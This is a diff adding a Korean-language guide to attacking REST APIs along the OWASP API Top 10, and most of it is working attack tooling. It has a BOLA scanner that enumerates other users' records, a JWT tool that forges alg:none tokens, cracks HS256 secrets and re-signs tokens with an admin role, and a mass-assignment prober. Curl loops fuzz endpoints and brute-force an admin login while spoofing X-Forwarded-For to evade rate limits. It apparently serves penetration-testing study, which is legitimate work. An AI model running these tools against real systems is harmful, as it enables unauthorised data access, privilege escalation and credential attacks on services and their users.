@@ -1,0 +1,426 @@
+# REST API 보안과 OWASP API Top 10
+
+## 1. OWASP API Security Top 10 (2023)
+
+| # | 취약점 | 설명 |
+|---|--------|------|
+| API1 | Broken Object Level Authorization | 객체 수준 인가 미흡 — 다른 사용자 리소스 접근 |
+| API2 | Broken Authentication | 인증 메커니즘 결함 — 토큰 노출·약한 자격증명 |
+| API3 | Broken Object Property Level Authorization | 속성 수준 인가 미흡 — 숨겨진 필드 노출 |
+| API4 | Unrestricted Resource Consumption | 속도 제한 없음 — DoS·비용 폭증 유발 |
+| API5 | Broken Function Level Authorization | 함수 수준 인가 미흡 — 관리자 엔드포인트 접근 |
+| API6 | Unrestricted Access to Sensitive Business Flows | 민감 비즈니스 플로우 무제한 접근 |
+| API7 | Server Side Request Forgery | SSRF — 내부 서비스 요청 위조 |
+| API8 | Security Misconfiguration | 보안 설정 오류 — 기본 자격증명·불필요한 기능 |
+| API9 | Improper Inventory Management | 버전 관리 미흡 — 구형 API 엔드포인트 노출 |
+| API10 | Unsafe Consumption of APIs | 외부 API 신뢰 과잉 |
+
+---
+
+## 2. BOLA (Broken Object Level Authorization)
+
+### 2.1 공격 패턴
+
+```bash
+# 정상 요청
+GET /api/v1/users/1001/profile
+Authorization: Bearer <token_user_1001>
+
+# BOLA 공격 — 다른 사용자 ID로 접근
+GET /api/v1/users/1002/profile
+Authorization: Bearer <token_user_1001>
+
+# 순차 ID 열거
+for id in $(seq 1000 1100); do
+  curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://api.target.com/v1/users/$id/profile" | jq .
+done
+```
+
+### 2.2 BOLA 스캐너
+
+```python
+#!/usr/bin/env python3
+"""BOLA 취약점 자동 탐지 스캐너."""
+
+import argparse
+import asyncio
+import json
+from dataclasses import dataclass
+from typing import Optional
+
+import httpx
+
+
+@dataclass
+class BOLAResult:
+    target_id: int | str
+    status_code: int
+    accessible: bool
+    data_snippet: str
+
+
+async def test_bola(
+    client: httpx.AsyncClient,
+    base_url: str,
+    endpoint_template: str,
+    test_id: int | str,
+    headers: dict[str, str],
+    own_id: int | str,
+) -> BOLAResult:
+    url = f"{base_url}{endpoint_template.format(id=test_id)}"
+    try:
+        resp = await client.get(url, headers=headers, timeout=10)
+        accessible = resp.status_code == 200 and str(test_id) != str(own_id)
+        snippet = resp.text[:200] if resp.status_code == 200 else ""
+        return BOLAResult(test_id, resp.status_code, accessible, snippet)
+    except httpx.RequestError as e:
+        return BOLAResult(test_id, 0, False, str(e))
+
+
+async def scan_bola(
+    base_url: str,
+    endpoint_template: str,
+    token: str,
+    own_id: str,
+    id_range: range,
+    concurrency: int = 20,
+) -> list[BOLAResult]:
+    headers = {"Authorization": f"Bearer {token}"}
+    semaphore = asyncio.Semaphore(concurrency)
+    results: list[BOLAResult] = []
+
+    async def bounded_test(tid: int) -> None:
+        async with semaphore:
+            r = await test_bola(client, base_url, endpoint_template, tid, headers, own_id)
+            if r.accessible:
+                print(f"[BOLA] ID {tid} accessible! Status: {r.status_code}")
+                print(f"  Snippet: {r.data_snippet[:100]}")
+            results.append(r)
+
+    async with httpx.AsyncClient(verify=False) as client:
+        await asyncio.gather(*[bounded_test(i) for i in id_range])
+
+    return results
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="BOLA 취약점 스캐너")
+    parser.add_argument("url", help="대상 API 베이스 URL")
+    parser.add_argument("endpoint", help="엔드포인트 템플릿 (예: /api/v1/users/{id}/profile)")
+    parser.add_argument("-t", "--token", required=True, help="인증 토큰")
+    parser.add_argument("--own-id", required=True, help="자신의 리소스 ID")
+    parser.add_argument("--start", type=int, default=1, help="시작 ID")
+    parser.add_argument("--end", type=int, default=100, help="끝 ID")
+    parser.add_argument("-c", "--concurrency", type=int, default=20, help="동시 요청 수")
+    parser.add_argument("-o", "--output", help="결과 JSON 출력 파일")
+    args = parser.parse_args()
+
+    results = asyncio.run(
+        scan_bola(
+            args.url, args.endpoint, args.token, args.own_id,
+            range(args.start, args.end + 1), args.concurrency,
+        )
+    )
+
+    accessible = [r for r in results if r.accessible]
+    print(f"\n총 {len(results)}개 테스트 / BOLA 취약 {len(accessible)}개")
+
+    if args.output:
+        with open(args.output, "w") as f:
+            json.dump([vars(r) for r in accessible], f, indent=2)
+        print(f"결과 저장: {args.output}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. JWT 취약점 분석
+
+### 3.1 일반적인 JWT 공격
+
+```bash
+# JWT 구조 디코딩
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.xxx" \
+  | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+
+# 알고리즘 none 공격
+python3 -c "
+import base64, json
+header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+payload = base64.b64encode(json.dumps({'sub':'1234','role':'admin'}).encode()).rstrip(b'=').decode()
+print(f'{header}.{payload}.')
+"
+
+# 약한 시크릿 크래킹 (hashcat)
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+```
+
+### 3.2 JWT 분석·변조 CLI
+
+```python
+#!/usr/bin/env python3
+"""JWT 취약점 분석 및 변조 도구."""
+
+import argparse
+import base64
+import hmac
+import json
+import hashlib
+from pathlib import Path
+
+
+def b64_decode(s: str) -> bytes:
+    padding = 4 - len(s) % 4
+    return base64.urlsafe_b64decode(s + "=" * padding)
+
+
+def b64_encode(b: bytes) -> str:
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+
+def decode_jwt(token: str) -> tuple[dict, dict, str]:
+    parts = token.split(".")
+    if len(parts) != 3:
+        raise ValueError("유효하지 않은 JWT 형식")
+    header = json.loads(b64_decode(parts[0]))
+    payload = json.loads(b64_decode(parts[1]))
+    return header, payload, parts[2]
+
+
+def forge_none_alg(token: str, new_payload: dict | None = None) -> str:
+    header, payload, _ = decode_jwt(token)
+    header["alg"] = "none"
+    if new_payload:
+        payload.update(new_payload)
+    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
+    return f"{h}.{p}."
+
+
+def crack_hs256(token: str, wordlist: Path) -> str | None:
+    header, payload, sig = decode_jwt(token)
+    parts = token.rsplit(".", 1)
+    message = parts[0].encode()
+    target_sig = b64_decode(sig)
+    with wordlist.open() as f:
+        for line in f:
+            secret = line.strip().encode()
+            computed = hmac.new(secret, message, hashlib.sha256).digest()
+            if computed == target_sig:
+                return line.strip()
+    return None
+
+
+def resign_hs256(token: str, secret: str, new_payload: dict | None = None) -> str:
+    header, payload, _ = decode_jwt(token)
+    if new_payload:
+        payload.update(new_payload)
+    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
+    message = f"{h}.{p}".encode()
+    sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
+    return f"{h}.{p}.{b64_encode(sig)}"
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="JWT 취약점 분석 도구")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    dec = sub.add_parser("decode", help="JWT 디코딩")
+    dec.add_argument("token")
+
+    none_p = sub.add_parser("none", help="alg:none 공격")
+    none_p.add_argument("token")
+    none_p.add_argument("--payload", help="변경할 페이로드 JSON")
+
+    crack_p = sub.add_parser("crack", help="HS256 시크릿 크래킹")
+    crack_p.add_argument("token")
+    crack_p.add_argument("wordlist", type=Path)
+
+    resign_p = sub.add_parser("resign", help="HS256 재서명")
+    resign_p.add_argument("token")
+    resign_p.add_argument("secret")
+    resign_p.add_argument("--payload", help="변경할 페이로드 JSON")
+
+    args = parser.parse_args()
+
+    match args.cmd:
+        case "decode":
+            h, p, _ = decode_jwt(args.token)
+            print("Header:", json.dumps(h, indent=2, ensure_ascii=False))
+            print("Payload:", json.dumps(p, indent=2, ensure_ascii=False))
+        case "none":
+            new_p = json.loads(args.payload) if args.payload else None
+            print(forge_none_alg(args.token, new_p))
+        case "crack":
+            secret = crack_hs256(args.token, args.wordlist)
+            print(f"시크릿 발견: {secret}" if secret else "시크릿 미발견")
+        case "resign":
+            new_p = json.loads(args.payload) if args.payload else None
+            print(resign_hs256(args.token, args.secret, new_p))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 4. API 정보 수집
+
+### 4.1 Swagger/OpenAPI 발견
+
+```bash
+# 일반적인 API 문서 경로
+wordlist=(
+  "/swagger.json" "/swagger.yaml" "/swagger-ui.html"
+  "/api/swagger.json" "/api/docs" "/api/v1/docs"
+  "/openapi.json" "/openapi.yaml"
+  "/api-docs" "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
+  "/redoc" "/graphql" "/graphiql"
+)
+
+for path in "${wordlist[@]}"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
+  [ "$code" == "200" ] && echo "[+] $path ($code)"
+done
+```
+
+### 4.2 HTTP 메서드 열거
+
+```bash
+# 허용된 HTTP 메서드 확인
+curl -s -X OPTIONS https://api.target.com/v1/users \
+  -H "Authorization: Bearer $TOKEN" -I | grep -i allow
+
+# 메서드 퍼징
+for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" \
+    https://api.target.com/v1/users)
+  echo "$method: $code"
+done
+```
+
+---
+
+## 5. Mass Assignment 공격
+
+```python
+#!/usr/bin/env python3
+"""Mass Assignment 취약점 탐지."""
+
+import argparse
+import json
+import httpx
+
+
+DANGEROUS_FIELDS = [
+    "role", "admin", "is_admin", "isAdmin", "privilege",
+    "permissions", "group", "verified", "active", "status",
+    "balance", "credit", "price", "discount",
+]
+
+
+def test_mass_assignment(
+    url: str,
+    method: str,
+    base_payload: dict,
+    token: str,
+) -> dict[str, int]:
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "Content-Type": "application/json",
+    }
+    results: dict[str, int] = {}
+
+    for field in DANGEROUS_FIELDS:
+        test_payload = {**base_payload, field: True}
+        with httpx.Client(verify=False) as client:
+            resp = getattr(client, method.lower())(
+                url, json=test_payload, headers=headers, timeout=10
+            )
+            if resp.status_code in (200, 201, 204):
+                try:
+                    body = resp.json()
+                    if field in str(body):
+                        print(f"[VULN] Mass Assignment: {field} 필드 반영됨")
+                        results[field] = resp.status_code
+                except Exception:
+                    pass
+
+    return results
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Mass Assignment 탐지")
+    parser.add_argument("url", help="대상 엔드포인트 URL")
+    parser.add_argument("-m", "--method", default="POST", choices=["POST", "PUT", "PATCH"])
+    parser.add_argument("-p", "--payload", required=True, help="기본 요청 페이로드 JSON")
+    parser.add_argument("-t", "--token", required=True)
+    args = parser.parse_args()
+
+    base_payload = json.loads(args.payload)
+    results = test_mass_assignment(args.url, args.method, base_payload, args.token)
+    print(f"\n취약 필드 {len(results)}개 발견: {list(results.keys())}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. API 버전 열거 및 구형 버전 공격
+
+```bash
+# API 버전 열거
+for ver in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 beta alpha dev; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    "https://api.target.com/$ver/users")
+  [ "$code" != "404" ] && echo "[+] /api/$ver/users: $code"
+done
+
+# 구형 API 버전에서 인증 우회 시도
+curl -s https://api.target.com/v1/admin/users \
+  -H "Authorization: Bearer $OLD_TOKEN"
+```
+
+---
+
+## 7. Rate Limiting 우회
+
+```bash
+# IP 로테이션으로 Rate Limit 우회
+for i in $(seq 1 100); do
+  curl -s -X POST https://api.target.com/v1/auth/login \
+    -H "X-Forwarded-For: 10.0.0.$i" \
+    -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"password'$i'"}' &
+done
+wait
+
+# 다양한 헤더로 IP 스푸핑 시도
+for header in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "CF-Connecting-IP"; do
+  curl -s -X POST https://api.target.com/v1/auth/login \
+    -H "$header: 1.2.3.4" \
+    -d '{"username":"admin","password":"test"}'
+done
+```
+
+---
+
+## 8. 참고 도구
+
+| 도구 | 용도 |
+|------|------|
+| `ffuf` | API 엔드포인트 퍼징 |
+| `arjun` | 숨겨진 파라미터 발견 |
+| `kiterunner` | API 경로 자동 발견 |
+| `jwt_tool` | JWT 취약점 분석 |
+| `Burp Suite` | API 트래픽 인터셉트 |
+| `mitmproxy` | API 프록시 분석 |
+| `postman` | API 테스트 자동화 |
